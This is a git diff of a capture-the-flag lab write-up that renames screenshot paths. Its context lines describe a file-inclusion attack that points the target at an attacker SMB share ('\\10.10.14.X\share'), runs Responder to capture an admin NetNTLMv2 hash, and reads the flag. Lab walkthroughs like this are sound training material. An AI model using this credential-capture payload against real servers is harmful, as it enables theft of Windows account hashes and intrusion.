@@ -35,7 +35,7 @@ Visited the site: **Unika**
 
 Found an input field that takes strings:
 
-![String input](./writeup-images/string input.png)
+![String input](./writeup-images/string_input.png)
 
 Tested for LFI using:
 
@@ -43,7 +43,7 @@ Tested for LFI using:
 \\10.10.14.X\share
 ```
 
-![LFI string input](./writeup-images/lfi string input result.png)
+![LFI string input](./writeup-images/lfi-string-input-result.png)
 
 Confirmed inclusion leads to outbound request from server — ✅ **vulnerable to LFI**.
 
@@ -57,11 +57,11 @@ Started `Responder` on local machine:
 sudo responder -I tun0
 ```
 
-![Responder started](./writeup-images/responder initiation.png)
+![Responder started](./writeup-images/responder-initiation.png)
 
 Then configured the parameter to call our malicious SMB path:
 
-![Setting page param](./writeup-images/setting page parameter.png)
+![Setting page param](./writeup-images/setting-page-parameter.png)
 
 ---
 
@@ -69,7 +69,7 @@ Then configured the parameter to call our malicious SMB path:
 
 Boom — captured a **NetNTLMv2 hash** for user `admin`.
 
-![Hash captured](./writeup-images/NetNTLMv for admin.png)
+![Hash captured](./writeup-images/NetNTLMv-for-admin.png)
 
 Saved the hash to a file: `hash.txt`
 
@@ -106,8 +106,8 @@ dir
 type flag.txt
 ```
 
-![Flag directory](./writeup-images/dir flag.txt.png)  
-![Flag content](./writeup-images/flag founded.png)
+![Flag directory](./writeup-images/dir-flag.png)  
+![Flag content](./writeup-images/flag-founded.png)
 
 ---
 
